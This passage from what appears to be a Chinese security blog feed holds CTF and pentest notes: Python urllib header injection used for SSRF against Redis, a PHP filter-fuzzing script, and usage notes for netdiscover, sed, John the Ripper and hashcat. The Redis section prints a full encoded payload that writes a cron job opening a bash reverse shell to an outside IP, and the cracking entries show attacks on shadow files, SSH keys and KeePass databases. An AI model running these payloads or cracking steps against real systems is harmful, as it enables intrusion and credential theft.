urllib.request.urlopen(url).info()</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(info)</span></pre></td></tr><tr><td class="code"><pre><span class="line">except urllib.error.URLError as e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(e)</span></pre></td></tr></table></figure>

<p>在vps监听</p>
<p><code>nc -lvvp 5555</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listening on [any] 7777 ...</span></pre></td></tr><tr><td class="code"><pre><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 36252</span></pre></td></tr><tr><td class="code"><pre><span class="line">GET &#x2F;?a</span></pre></td></tr><tr><td class="code"><pre><span class="line">header::8080&#x2F;test&#x2F;?test&#x3D;a HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: identity</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: 127.0.0.1:7777</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Python-urllib&#x2F;3.7</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr></table></figure>

<h2 id="配合ssrf-redis"><a href="#配合ssrf-redis" class="headerlink" title="配合ssrf,redis"></a>配合ssrf,redis</h2><p>利用CVE-2016-5699 redis未授权访问 计划任务反弹shell</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0d%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F111.231.169.25%2F5555%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2Fcrontabs%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:6379</span></pre></td></tr></table></figure>

<p> 如果urllib2抛出<code>URLError:</code>的异常</p>
<p>可尝试将%2F双重编码 </p>
<p>url过长也可能抛出异常，可以分为几个url</p>
<p>urldecode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">*3</span></pre></td></tr><tr><td class="code"><pre><span class="line">$3</span></pre></td></tr><tr><td class="code"><pre><span class="line">set</span></pre></td></tr><tr><td class="code"><pre><span class="line">$1</span></pre></td></tr><tr><td class="code"><pre><span class="line">1</span></pre></td></tr><tr><td class="code"><pre><span class="line">$62</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;111.231.169.25&#x2F;5555 0&gt;&amp;1</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs</span></pre></td></tr><tr><td class="code"><pre><span class="line">config set dbfilename root</span></pre></td></tr><tr><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="code"><pre><span class="line">:6379</span></pre></td></tr></table></figure>

<p> Redis的通讯协议 （ 突破空格的限制）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*3 &#x2F;&#x2F;表示3个参数</span></pre></td></tr><tr><td class="code"><pre><span class="line">$3 &#x2F;&#x2F;下面的参数有3个字节</span></pre></td></tr><tr><td class="code"><pre><span class="line">set</span></pre></td></tr><tr><td class="code"><pre><span class="line">$1 &#x2F;&#x2F;表示下一个参数有一个字节</span></pre></td></tr><tr><td class="code"><pre><span class="line">1</span></pre></td></tr><tr><td class="code"><pre><span class="line">$62 &#x2F;&#x2F;表示下一个参数有六十二个字节（加上第一个%0a）</span></pre></td></tr></table></figure>

<p>不同操作系统的系统任务调度文件 </p>
<p>用户 XXX 调度文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu 下路径</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Alpine 下路径</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;xxx</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">debian 下的路径（xxx 可以是任意东西）</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;xxx</span></pre></td></tr><tr><td class="code"><pre><span class="line">或者</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</span></pre></td></tr><tr><td class="code"><pre><span class="line">但是写这个路径的时候，文件内不能加用户名。</span></pre></td></tr></table></figure>



<p>参考</p>
<p><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p>
<p><a href="https://strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p>
<p>[<a href="https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html" target="_blank" rel="noopener">linux 定时任务 crontab 反弹 shell</a>]</p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/web/2019/10/13/complex/" target="_blank" rel="noopener">THUCTF2019之ComplexWeb</a></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>漏洞</tag>
        <tag>python</tag>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>phpfuzz</title>
    <url>/2019/12/11/phpfuzz/</url>
    <content><![CDATA[<h3 id="php代码审计（含过滤）"><a href="#php代码审计（含过滤）" class="headerlink" title="php代码审计（含过滤）"></a>php代码审计（含过滤）</h3><ul>
<li><p>先理清楚<a href="https://regex101.com/" target="_blank" rel="noopener">正则</a>过滤，寻找漏过</p>
</li>
<li><p>再使用以下脚本fuzz过滤的php函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">$allPHPfunNum &#x3D; count(get_defined_functions()[internal]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;当前版本PHP的所有内置php函数数量为&quot;.$allPHPfunNum.&quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$a &#x3D; array();</span></pre></td></tr><tr><td class="code"><pre><span class="line">$b &#x3D; 0;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">for($i&#x3D;0; $i &lt; $allPHPfunNum; $i++)&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $Fun &#x3D; get_defined_functions()[internal][$i];</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  if(!preg_match(&#39;&#x2F;_|readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $Fun))&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $a[$b]&#x3D;$Fun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $b++;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;满足过滤条件的函数数量为&quot;.count($a).&quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">print_r($a);</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<p>php读取文件函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file()      &#x2F;&#x2F;把文件读入一个数组中。</span></pre></td></tr><tr><td class="code"><pre><span class="line">fopen()    &#x2F;&#x2F;打开一个文件或 URL。</span></pre></td></tr><tr><td class="code"><pre><span class="line">fread()    &#x2F;&#x2F;        读取打开的文件。</span></pre></td></tr><tr><td class="code"><pre><span class="line">fgets()   &#x2F;&#x2F;从打开的文件中返回一行。</span></pre></td></tr><tr><td class="code"><pre><span class="line">fgetss()   &#x2F;&#x2F;从打开的文件中读取一行并过滤掉 HTML 和 PHP 标记。</span></pre></td></tr><tr><td class="code"><pre><span class="line">fgetc()  &#x2F;&#x2F;从打开的文件中返回字符。</span></pre></td></tr><tr><td class="code"><pre><span class="line">dirname() &#x2F;&#x2F;返回路径中的目录名称部分。</span></pre></td></tr><tr><td class="code"><pre><span class="line">readfile() &#x2F;&#x2F;读取一个文件，并输出到输出缓冲。</span></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>netdiscover</title>
    <url>/2019/12/11/netdiscover/</url>
    <content><![CDATA[<h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><ul>
<li><p>快捷使用    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.0&#x2F;24</span></pre></td></tr><tr><td class="code"><pre><span class="line">netdiscover -p [-r] 被动模式</span></pre></td></tr></table></figure>
</li>
<li></li>
<li><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Netdiscover是一个简单的ARP扫描器，可用于扫描网络中的活动主机。它也可以扫描多个子网。它只是在实时显示（ncurse）中产生输出。可以在可进入网络的渗透测试的第一阶段中使用。Netdiscover是一个简单的初始侦查工具，非常方便。 </p>
</li>
<li><h3 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h3><ol>
<li>简单的Arp扫描仪</li>
<li>可在主动和被动模式下工作</li>
<li>实时显示已识别的主机</li>
<li>能够扫描多个子网</li>
<li>定时选项</li>
</ol>
</li>
<li><h3 id="选项："><a href="#选项：" class="headerlink" title="选项："></a>选项：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-i设备：您的网络设备</span></pre></td></tr><tr><td class="code"><pre><span class="line">-r范围：扫描给定范围而不是自动扫描。192.168.6.0&#x2F;24,&#x2F;16,&#x2F;8</span></pre></td></tr><tr><td class="code"><pre><span class="line">-l文件：扫描包含在给定文件中的范围列表</span></pre></td></tr><tr><td class="code"><pre><span class="line">-p被动模式：不发送任何内容，仅嗅探</span></pre></td></tr><tr><td class="code"><pre><span class="line">-m文件：扫描已知的MAC和主机名列表</span></pre></td></tr><tr><td class="code"><pre><span class="line">-F过滤器：自定义pcap过滤器表达式（默认值：“ arp”）</span></pre></td></tr><tr><td class="code"><pre><span class="line">-s时间：每个arp请求之间的睡眠时间（毫秒）</span></pre></td></tr><tr><td class="code"><pre><span class="line">-n节点：用于扫描的最后一个IP八位字节（从2到253）</span></pre></td></tr><tr><td class="code"><pre><span class="line">-c count：发送每个arp请求的次数（对于丢包的网络）</span></pre></td></tr><tr><td class="code"><pre><span class="line">-f启用快速模式扫描，节省大量时间，建议用于自动</span></pre></td></tr><tr><td class="code"><pre><span class="line">-d忽略用于自动扫描和快速模式的家庭配置文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">-S在每个请求之间启用睡眠时间抑制（硬核模式）</span></pre></td></tr><tr><td class="code"><pre><span class="line">-P打印结果的格式适合于另一个程序进行解析</span></pre></td></tr><tr><td class="code"><pre><span class="line">-N不打印标题。仅在启用-P时有效。</span></pre></td></tr><tr><td class="code"><pre><span class="line">-L在可解析输出模式（-P）中，在活动扫描完成后继续侦听</span></pre></td></tr></table></figure>

<p><strong>指定范围</strong></p>
<p>我们可以使用-r选项扫描特定范围</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：netdiscover -r &lt;范围&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">命令：netdiscover -r 192.168.1.0&#x2F;24</span></pre></td></tr></table></figure>

<p><strong>文件中的多个范围</strong></p>
<p>我们还可以扫描多个范围。当您的大型网络具有多个子网和网络时，这很有用。为此，我们只需要逐行指定要扫描的所有范围</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：netdiscover -l &lt;包含范围的文件&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">命令：netdiscover -l 范围</span></pre></td></tr></table></figure>

<p>有时最好保持安静。-p选项对此有所帮助，但要以耐心为代价。        </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：netdiscover -p -r &lt;范围，可选&gt;</span></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<p>如果要将其通过管道传输到文件，也有一个可分析的输出选项。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：netdiscover -P &lt;可分析&gt; -N &lt;省略标题&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">命令：netdiscover -r 192.168.1.1&#x2F;24 -PN</span></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>command</tag>
        <tag>扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>sed</title>
    <url>/2019/12/11/sed/</url>
    <content><![CDATA[<h1 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h1><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>sed [-hnV] [-e (script)][-f (script-file)][file]</code></p>
<p><strong>参数说明</strong>：</p>
<ul>
<li>-e script或–expression=script 以选项中指定的script来处理输入的文本文件。<strong>可使用多个-e参数执行多个动作</strong></li>
<li>-f&lt;script文件&gt;或–file=&lt;script文件&gt; 以选项中指V定的script文件来处理输入的文本文件。</li>
<li>-h或–help 显示帮助。</li>
<li>-n或–quiet或–silent 仅显示script处理后的结果。</li>
<li>-V或–version 显示版本信息。</li>
<li>-i 直接替换文件中内容，不用打开</li>
</ul>
<p><strong>动作说明</strong>：</p>
<ul>
<li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li>
<li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li>
<li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li>
<li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li>
<li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li>
<li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g </li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>1.添加–<strong>a</strong>（行后）</p>
<pre><code>在第四行添加一行内容为  *newline*

`sed &apos;4a newline&apos;`</code></pre><p>2.取代–<strong>c</strong></p>
<pre><code>将2-5行内容换成*2-5line*

`sed &apos;2,5c 2-5line&apos;`

2-5行的全部内容换成一个字串2-5line，并不是每行都会单独取代</code></pre><p>3.删除–<strong>d</strong></p>
<pre><code>删除4到最后一行

`sed &apos;4,$d&apos;`</code></pre><p>4.插入–<strong>i</strong>（行前）</p>
<pre><code>在第1行插入内容为*firstline*与secline两行

`sed &apos;1i first\`

`secline&apos;`</code></pre><p>5.搜寻</p>
<pre><code>寻找含有root的行并删除

`sed &apos;/root/d&apos;`</code></pre><p>5.替换–<strong>s</strong></p>
<pre><code>`sed s/被替换/替换/g`

类似vim一样的用法</code></pre><p><strong>去除空行用vim中<code>：%s/\n//g</code> 不要用sed ，很复杂</strong></p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>command</tag>
        <tag>文件操作</tag>
      </tags>
  </entry>
  <entry>
    <title>john</title>
    <url>/2019/12/11/john/</url>
    <content><![CDATA[<h1 id="john"><a href="#john" class="headerlink" title="john"></a>john</h1><ul>
<li><h3 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;rockyou.txt .&#x2F;shadow</span></pre></td></tr><tr><td class="code"><pre><span class="line">john --show .&#x2F;shadow</span></pre></td></tr></table></figure>
</li>
<li><h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p><img src="/images/john.png" alt="help"></p>
</li>
<li><h3 id="attact"><a href="#attact" class="headerlink" title="attact"></a>attact</h3><p> 在破解密码方面，有三种类型的攻击：<br>1.暴力破解：通过依次处理每个可能的字母、数字和特殊字符组合来猜测密码。这是一个很漫长的过程，但却很有效果。<br>2.字典攻击：此攻击利用包含常见密码列表的文件(通常取自某种类型的漏洞)来猜测给定的密码。在CTF中应用比较广泛，但在正常情况下不是特别常见。<br>3.彩虹表：彩虹表是一系列预先计算好的散列。其思想是，这些彩虹表包含给定算法的所有散列。通过查找代替了破解。请注意，这需要相当大的处理能力才能实现。 </p>
</li>
<li><h3 id="默认大字典"><a href="#默认大字典" class="headerlink" title="默认大字典"></a>默认大字典</h3><p><a href="https://wiki.skullsecurity.org/Passwords" target="_blank" rel="noopener">字典地址</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gunzip &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">wc -l &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span></pre></td></tr></table></figure>
</li>
<li><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul>
<li><h4 id="linux密码"><a href="#linux密码" class="headerlink" title="linux密码"></a>linux密码</h4><p>将passwd与shadow转换成john可破解格式（现已可直接破解）</p>
<p><code>unshadow /etc/passed /etc/shadow &gt; ./password</code></p>
<p><code>john --wordlist=/usr/share/wordlist/rockyou.txt ./password</code></p>
</li>
<li><h4 id="SSH密钥"><a href="#SSH密钥" class="headerlink" title="SSH密钥"></a>SSH密钥</h4><p> 要测试JTR的SSH密钥密码破解能力，首先要创建一组新的私钥。注意：JTR没有破解文件本身(即生成的密钥中的字节数并不重要)，JTR只是破解私钥的加密密码。<br>在这种情况下，使用可预测的密码创建公钥/私钥对： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Create some private key</span></pre></td></tr><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span></pre></td></tr><tr><td class="code"><pre><span class="line"># Create encrypted zip</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;sbin&#x2F;ssh2john ~&#x2F;.ssh&#x2F;id_rsa &gt; id_rsa.hash</span></pre></td></tr></table></figure>

<p>接下来，您需要做的就是使用您的字典将John the Ripper指向给定文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa.hash</span></pre></td></tr></table></figure>
</li>
<li><h4 id="Keepass2数据库（不常用）"><a href="#Keepass2数据库（不常用）" class="headerlink" title="Keepass2数据库（不常用）"></a>Keepass2数据库（不常用）</h4><p> Keepass怎么样？如果您不知道，Keepass是一个开源的，跨平台的密码管理库。<br> 所以让我们创建一个可以攻击的库。首先，安装Keepass CLI(“kpcli”)。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y kpcli</span></pre></td></tr></table></figure>

<p> 接下来，创建库。你不需要在库里存储任何密码，一个空的库就可以了。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kpcli</span></pre></td></tr><tr><td class="code"><pre><span class="line">KeePass CLI (kpcli) v3.1 is ready for operation.</span></pre></td></tr><tr><td class="code"><pre><span class="line">Type &#39;help&#39; for a description of available commands.</span></pre></td></tr><tr><td class="code"><pre><span class="line">Type &#39;help &lt;command&gt;&#39; for details on individual commands.</span></pre></td></tr><tr><td class="code"><pre><span class="line">kpcli:&#x2F;&gt; saveas newdb.kdb</span></pre></td></tr><tr><td class="code"><pre><span class="line">Please provide the master password: *************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">Retype to verify: *************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">kpcli:&#x2F;&gt; exit</span></pre></td></tr></table></figure>

<p> 与攻击SSH私钥和Linux密码散列一样，将Keepass数据库转换为与JTR兼容的格式。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keepass2john newdb.kdb &gt; newdb.kdb.hash</span></pre></td></tr></table></figure>

<p> 攻击！</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt newdb.kdb.hash</span></pre></td></tr></table></figure>
</li>
<li><h4 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h4> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Install rar</span></pre></td></tr><tr><td class="code"><pre><span class="line">sudo apt-get install -y rar</span></pre></td></tr><tr><td class="code"><pre><span class="line"># Create some dummy file</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;Hello&quot; &gt; hello.txt</span></pre></td></tr><tr><td class="code"><pre><span class="line"># Create an encrypted RAR file with the password &quot;password&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">rar a -hppassword encrypted.rar hello.txt</span></pre></td></tr></table></figure>

<p> 接下来，将其转换为JTR的攻击格式：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rar2john encrypted.rar &gt; encrypted.rar.hash</span></pre></td></tr></table></figure>

<p> 之后用john破解</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>command</tag>
        <tag>密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>hashcat</title>
    <url>/2019/12/11/hashcat/</url>
    <content><![CDATA[<h1 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h1><ul>
<li><h3 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 --force [hash]  &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt -o .&#x2F;result     [字典]</span></pre></td></tr><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 --force [hashfile]  &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt -o .&#x2F;result [批量hash]</span></pre></td></tr><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 0 --force f2aec315704b5f007915bdbbae5a9f5c te?d?d?dst			 [掩码爆破]</span></pre></td></tr><tr><td class="code"><pre><span class="line">hashcat -a 6 -m 0 --force 9dc9d5ed5031367d42543763423c24ee password.txt ?l?l?l?l?l		 [字典掩码]</span></pre></td></tr><tr><td class="code"><pre><span class="line">hashcat [hash] --show</span></pre></td></tr></table></figure>
</li>
<li><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p> Hashcat是自称世界上最快的密码恢复工具。它在2015年之前拥有专有代码库，但现在作为免费软件发布。适用于Linux，OS X和Windows的版本可以使用基于CPU或基于GPU的变体。支持hashcat的散列算法有Microsoft LM哈希，MD4，MD5，SHA系列，Unix加密格式，MySQL和Cisco PIX等。 </p>
</li>
<li><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span></pre></td></tr><tr><td class="code"><pre><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span></pre></td></tr><tr><td class="code"><pre><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span></pre></td></tr><tr><td class="code"><pre><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span></pre></td></tr><tr><td class="code"><pre><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span></pre></td></tr><tr><td class="code"><pre><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span></pre></td></tr><tr><td class="code"><pre><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span></pre></td></tr><tr><td class="code"><pre><span class="line">--increment-max  密码最大长度,同上</span></pre></td></tr><tr><td class="code"><pre><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span></pre></td></tr><tr><td class="code"><pre><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span></pre></td></tr><tr><td class="code"><pre><span class="line">--remove     删除已被破解成功的hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">-r       使用自定义破解规则</span></pre></td></tr></table></figure>

<ul>
<li><h4 id="a参数破解模式"><a href="#a参数破解模式" class="headerlink" title="a参数破解模式"></a><strong>a</strong>参数破解模式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> # | Mode</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 0 | Straight（字段破解）</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 1 | Combination（多字典组合破解）</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 3 | Brute-force（掩码暴力破解）</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 6 | Hybrid Wordlist + Mask（字典+掩码破解）</span></pre></td></tr><tr><td class="code"><pre><span class="line"> 7 | Hybrid Mask + Wordlist（掩码+字典破解）</span></pre></td></tr></table></figure>
</li>
<li><h4 id="m参数hash类型（详见文末）"><a href="#m参数hash类型（详见文末）" class="headerlink" title="m参数hash类型（详见文末）"></a><strong>m</strong>参数hash类型（详见文末）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- [ Hash modes ] -</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">      # | Name                                             | Category</span></pre></td></tr><tr><td class="code"><pre><span class="line">  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    900 | MD4                                              | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">      0 | MD5                                              | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">   5100 | Half MD5                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">    100 | SHA1                                             | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">   1300 | SHA2-224                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">   1400 | SHA2-256                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">  10800 | SHA2-384                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">   1700 | SHA2-512                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">  17300 | SHA3-224                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">  17400 | SHA3-256                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">  17500 | SHA3-384                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">  17600 | SHA3-512                                         | Raw Hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">     10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="code"><pre><span class="line">     20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr></table></figure>
</li>
<li><h3 id="掩码设置"><a href="#掩码设置" class="headerlink" title="掩码设置"></a>掩码设置</h3><ul>
<li>常见字符集</li>
</ul>
